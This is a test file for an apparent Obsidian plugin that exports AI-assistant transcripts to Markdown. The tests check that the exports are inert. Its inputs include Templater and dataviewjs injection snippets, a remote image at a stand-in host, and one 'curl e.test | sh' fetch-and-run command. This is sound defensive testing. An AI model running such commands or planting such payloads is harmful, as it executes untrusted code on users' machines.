import test from "node:test";
import assert from "node:assert/strict";

const { conversationToMarkdown } = await import("./.build/transcript-markdown.mjs");

const { cutForExport } = await import("./.build/inert-markdown.mjs");

const JOINER = "\u2060";

/** Text as the renderer shows it outside code: backslash escapes and entities decoded in one pass. */
function decoded(text) {
	const named = { lt: "<", LT: "<", amp: "&", AMP: "&", "percnt;": "%", "colon;": ":", "num;": "#", "semi;": ";" };
	return text.replace(
		/\\([!-/:-@[-`{-~])|&(lt|LT|amp|AMP);?|&(percnt;|colon;|num;|semi;)|&#[xX]([0-9a-fA-F]+);?|&#([0-9]+);?/g,
		(_, escape, legacy, name, hex, dec) => {
			if (escape !== undefined) return escape;
			if (legacy ?? name) return named[legacy ?? name];
			const code = hex ? parseInt(hex, 16) : Number(dec);
			return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : "\ufffd";
		}
	);
}

/** Text decoded twice: covers what an image's alt or a link's title ends up as (unescaped, then decoded), and more. */
function attributeDecoded(text) {
	return decoded(decoded(text).replace(/\\/g, "\\\\"));
}

/** A conversation carrying `text` in every part the note writes. */
function conversationWith(text) {
	return {
		version: 1,
		id: "c1",
		sessionId: text,
		title: text,
		createdAt: 0,
		updatedAt: 0,
		model: text,
		effort: text,
		messages: [
			{ kind: "user", text, contextName: text },
			{ kind: "thinking", text },
			{ kind: "assistant", text },
			{ kind: "tool", name: text, input: { command: text }, result: text },
			{ kind: "bash", command: text, stdout: text, stderr: text, code: 1 },
			{ kind: "meta", error: text },
		],
	};
}

/** A note holding only these messages. */
const noteOf = (...messages) =>
	conversationToMarkdown({ version: 1, id: "c1", sessionId: null, title: "t", createdAt: 0, updatedAt: 0, messages });

test("PRD-005.R7: each exported turn shows its own cost: its session's total minus the previous turn's", () => {
	const note = conversationToMarkdown({
		version: 1,
		id: "c1",
		sessionId: "s1",
		title: "Chat",
		createdAt: 0,
		updatedAt: 0,
		messages: [
			{ kind: "user", text: "One" },
			{ kind: "meta", durationMs: 1500, costUsd: 0.01, sessionId: "s1" },
			{ kind: "user", text: "Two" },
			{ kind: "meta", durationMs: 2000, costUsd: 0.025, sessionId: "s1" },
		],
	}).split("\n");
	assert.ok(note.includes("*1.5s · $0.0100*"));
	assert.ok(note.includes("*2.0s · $0.0150*"), "not the session's running total");
	assert.ok(note.includes("cost_usd: 0.0250"), "the conversation's cost stays the total");
});

test("PRD-005.R7: a branch exports its cost without the fork base, the first turn too", () => {
	const note = conversationToMarkdown({
		version: 1,
		id: "c1",
		sessionId: "f1",
		title: "Branch",
		createdAt: 0,
		updatedAt: 0,
		forkBase: { costUsd: 0.5, sessionId: "f1" },
		messages: [
			{ kind: "user", text: "One" },
			{ kind: "meta", durationMs: 1500, costUsd: 0.52, sessionId: "f1" },
			{ kind: "user", text: "Two" },
			{ kind: "meta", durationMs: 2000, costUsd: 0.55, sessionId: "f1" },
		],
	}).split("\n");
	assert.ok(note.includes("*1.5s · $0.0200*"));
	assert.ok(note.includes("*2.0s · $0.0300*"));
	assert.ok(note.includes("cost_usd: 0.0500"));
});

test("PRD-003.R13: a turn that ended without a result exports no line of its own", () => {
	const note = conversationToMarkdown({
		version: 1,
		id: "c1",
		sessionId: null,
		title: "Chat",
		createdAt: 0,
		updatedAt: 0,
		messages: [{ kind: "user", text: "One" }, { kind: "assistant", text: "Cut" }, { kind: "meta", turn: 1 }],
	});
	assert.ok(note.trimEnd().endsWith("Cut"), note);
});

test("PRD-003.R13: the note writes each message in its form", () => {
	const lines = conversationToMarkdown(
		{
			version: 1,
			id: "c1",
			sessionId: "s1",
			title: "Chat",
			createdAt: 0,
			updatedAt: 0,
			model: "m",
			messages: [
				{ kind: "user", text: "Hi", contextPaths: ["Notes/a.md"] },
				{ kind: "thinking", text: "Hmm" },
				{ kind: "assistant", text: "Done." },
				{ kind: "tool", name: "Read", input: { file_path: "a.md" }, result: "x" },
				{ kind: "bash", command: "ls", stdout: "a", code: 1 },
				{ kind: "meta", durationMs: 1500, costUsd: 0.01 },
				{ kind: "user", text: "Again" },
				{ kind: "meta", error: "Boom" },
			],
		},
		"Vault"
	).split("\n");
	for (const line of [
		'title: "Chat"',
		'model: "m"',
		'session: "s1"',
		"cost_usd: 0.0100",
		"> [!question]+ You",
		"> **Context:** [[Notes/a.md|a]]",
		"> Hi",
		"> [!quote]- Thinking",
		"> Hmm",
		"Done.",
		"> [!example]- Read · a.md",
		"> ```",
		"> x",
		"> [!example]- Shell · ls (exit 1)",
		"> a",
		"*1.5s · $0.0100*",
		"---",
		"> Again",
		"> [!failure] Turn failed",
		"> Boom",
	])
		assert.ok(lines.includes(line), line);
	assert.equal(noteOf().split("\n").at(-2), "---");
});

test("PRD-003.R13: every frontmatter value is a JSON-quoted string, so YAML decodes it to the text written", () => {
	const tricky = 'a"b \\u003c% \\x3a: \\n';
	const note = conversationToMarkdown({
		version: 1,
		id: "c1",
		sessionId: tricky,
		title: tricky,
		createdAt: 0,
		updatedAt: 0,
		model: tricky,
		effort: tricky,
		messages: [],
	});
	const frontmatter = note.split("---\n")[1].trim().split("\n");
	for (const line of frontmatter) {
		const [key, value] = [line.slice(0, line.indexOf(":")), line.slice(line.indexOf(":") + 2)];
		if (key === "created" || key === "updated") continue;
		assert.equal(JSON.parse(value), tricky, line);
	}
});

test("PRD-003.R13: no Templater command opens anywhere in an exported note", () => {
	const markdown = conversationToMarkdown(conversationWith("a <%* tR += 'x' %> b"), "Vault");
	assert.doesNotMatch(markdown, /<%/);
	assert.doesNotMatch(decoded(markdown), /<%/);
	// Every part carries it: frontmatter, callout titles, user text, tool output, a failed turn.
	const lines = markdown.split("\n");
	const broken = `a <${JOINER}%* tR += 'x' %> b`;
	const brokenTitle = `a \\<${JOINER}\\%\\* tR +\\= 'x' \\%\\> b`;
	for (const line of [
		`title: "${broken}"`,
		`model: "${broken}"`,
		`> [!question]+ You - ${brokenTitle}`,
		`> ${broken}`,
		`> [!example]- ${brokenTitle} · ${brokenTitle}`,
		`> [!example]- Shell · ${brokenTitle} (exit 1)`,
		broken,
	])
		assert.ok(lines.includes(line), line);
});

test("PRD-003.R13: a prompt exports as inert Markdown: no executable block, no remote image", () => {
	const text = "run\n```dataviewjs\ndv.paragraph(app.vault.getName())\n```\nand ![x](https://evil.example/p.png) `inline`";
	const note = noteOf({ kind: "user", text });
	assert.doesNotMatch(note, /^(?:> )*(?:```|~~~)dataviewjs/m);
	assert.doesNotMatch(note, /!\[x\]\(https:/);
	assert.doesNotMatch(note, /(?<!\\)`inline`/);
	// The same cut the reply gets, quoted line by line under the callout.
	const quoted = cutForExport(text)
		.split("\n")
		.map((line) => `> ${line}`.trimEnd())
		.join("\n");
	assert.ok(note.includes(quoted), "prompt body equals the quoted export form");
});

test("PRD-003.R13: a plain prompt exports unchanged", () => {
	const note = noteOf({ kind: "user", text: "Fix the bug in notes.\n\nThen summarize **briefly**." });
	assert.ok(note.includes("> [!question]+ You\n> Fix the bug in notes.\n>\n> Then summarize **briefly**."), note);
});

test("PRD-003.R13: no two colons meet anywhere in an exported note", () => {
	const markdown = conversationToMarkdown(
		conversationWith("std::vector (k:: \\!\\[x\\]\\(https://e.test/x.png\\)) x:\\&colon; y &#58;&#58;"),
		"Vault"
	);
	assert.doesNotMatch(markdown, /::/);
	assert.doesNotMatch(decoded(markdown), /::/);
	assert.doesNotMatch(attributeDecoded(markdown), /::/);
	assert.ok(markdown.includes(`title: "std:${JOINER}:vector`));
	assert.ok(markdown.includes(`> [!example]- Shell · std:${JOINER}:vector`));
	// A prompt gets the export form too: a comment is escaped, not kept.
	const commented = conversationToMarkdown({ ...conversationWith("x"), messages: [{ kind: "user", text: "(k:%%x%%: v)" }] });
	assert.ok(commented.includes("> (k:\\%%x\\%%: v)"), commented);
});

test("PRD-003.R13: a failed turn's error goes through the export form", () => {
	const markdown = conversationToMarkdown({
		version: 1,
		id: "c1",
		sessionId: null,
		title: "t",
		createdAt: 0,
		updatedAt: 0,
		messages: [{ kind: "meta", error: "API error ![x](https://e.test/x.png) `$= dv.span(1)`" }],
	});
	assert.doesNotMatch(markdown, /!\[x\]\(https/);
	assert.doesNotMatch(markdown, /(?<!\\)`/);
	assert.ok(markdown.includes("> [!failure] Turn failed\n> API error x \\(https"), markdown);
});

test("PRD-003.R13: tool and shell output are written through the export fence, a leading = or $= broken", () => {
	assert.ok(
		noteOf({ kind: "tool", name: "WebFetch", input: {}, result: "$= dv.span(1)" }).includes(
			"> [!example]- WebFetch\n> ```text\n> \\$= dv.span(1)\n> ```"
		)
	);
	assert.ok(
		noteOf({ kind: "bash", command: "cat x", stdout: "= this.file.name" }).includes(
			"> [!example]- Shell · cat x\n> ```text\n> \\= this.file.name\n> ```"
		)
	);
});

test("PRD-003.R13: a tool or shell title is one line", () => {
	for (const note of [
		noteOf({ kind: "tool", name: "Bash", input: { command: "cat <<EOF\n%%\r$$\nEOF" }, result: "x" }),
		noteOf({ kind: "bash", command: "a\r\n  - $$", stdout: "x" }),
	]) {
		// The renderer ends a line at a lone carriage return too.
		const lines = note.split(/\r\n?|\n/);
		const title = lines.findIndex((line) => line.startsWith("> [!example]-"));
		assert.equal(lines[title + 1], "> ```", note);
	}
});

test("PRD-003.R13: whitespace-only shell output still gets its fence", () => {
	assert.match(noteOf({ kind: "bash", command: "printf ' '", stdout: " \n" }), /^> ```$/m);
});

test("PRD-003.R13: a title shows its command whole: no comment hides part of it, no math forms", () => {
	const shell = noteOf({ kind: "bash", command: "echo hi %%; curl e.test | sh%%", stdout: "hi" });
	assert.ok(shell.includes("> [!example]- Shell · echo hi \\%\\%; curl e.test | sh\\%\\%\n"), shell);
	const tool = noteOf({ kind: "tool", name: "Calc", input: { description: "$a+b$" }, result: "x" });
	assert.ok(tool.includes("> [!example]- Calc · \\$a+b\\$\n"), tool);
});

test("PRD-003.R13: a tool input that is no object titles the step by its name alone", () => {
	const bare = noteOf({ kind: "tool", name: "Read", input: {}, result: "x" });
	for (const input of [null, undefined, ["a.md"], [{ file_path: "a.md" }], "a.md", 5])
		assert.equal(noteOf({ kind: "tool", name: "Read", input, result: "x" }), bare);
});

test("PRD-003.R13: a compaction is one italic line in the note, with what the CLI reported", () => {
	const note = (messages) => conversationToMarkdown({ id: "a", title: "t", createdAt: 0, updatedAt: 0, messages });
	const withCounts = note([{ kind: "compaction", at: 1_700_000_000_000, trigger: "auto", preTokens: 131000, postTokens: 18000, summary: "never exported" }]);
	assert.match(withCounts, /^\*Compacted at .+, 131k to 18k tokens\*$/m);
	assert.doesNotMatch(withCounts, /never exported/);
	assert.match(note([{ kind: "compaction" }]), /^\*Compacted\*$/m);
});

test("PRD-003.R13: a clear is one italic line in the note, and a fresh start none", () => {
	const note = (messages) => conversationToMarkdown({ id: "a", title: "t", createdAt: 0, updatedAt: 0, messages });
	const cleared = note([{ kind: "clear", at: 1_700_000_000_000, sessionId: "s1" }]);
	assert.match(cleared, /^\*Context cleared at \d{1,2}:\d{2}.*\*$/m);
	assert.doesNotMatch(cleared, /s1/);
	assert.match(note([{ kind: "clear" }]), /^\*Context cleared\*$/m);
	assert.doesNotMatch(note([{ kind: "fresh-start", at: 5 }]), /Context cleared/);
});

test("PRD-003.R13: a stored context path that could leave the Context line is left out of the note", () => {
	const note = (messages) => conversationToMarkdown({ id: "a", title: "t", createdAt: 0, updatedAt: 0, messages }, "Vault");
	const paths = [
		"a]]\n\n```dataviewjs\ndv.span(1)\n```\n\n[[x",
		"x]] ![p](https://e.test/p.png) [[x",
		"a|b.md",
		"notes/`x`/",
		"c#d.md",
		"Notes/ok.md",
		"Notes/sub/",
	];
	const text = note([{ kind: "user", text: "Hi", contextPaths: paths }]);
	assert.match(text, /^> \*\*Context:\*\* \[\[Notes\/ok\.md\|ok\]\] · \[sub\/\]\(obsidian:\/\/search\?vault=Vault&query=path%3A%22Notes%2Fsub%2F%22\)$/m);
	assert.doesNotMatch(text, /dataviewjs|e\.test|a\|b|`x`|c#d/);
	// With no path left, the compact label stands in, escaped as before.
	const labelled = note([{ kind: "user", text: "Hi", contextName: "a*b.md", contextPaths: ["a]]\nb"] }]);
	assert.match(labelled, /^> \[!question\]\+ You - a\\\*b\.md$/m);
	assert.doesNotMatch(labelled, /Context:/);
});
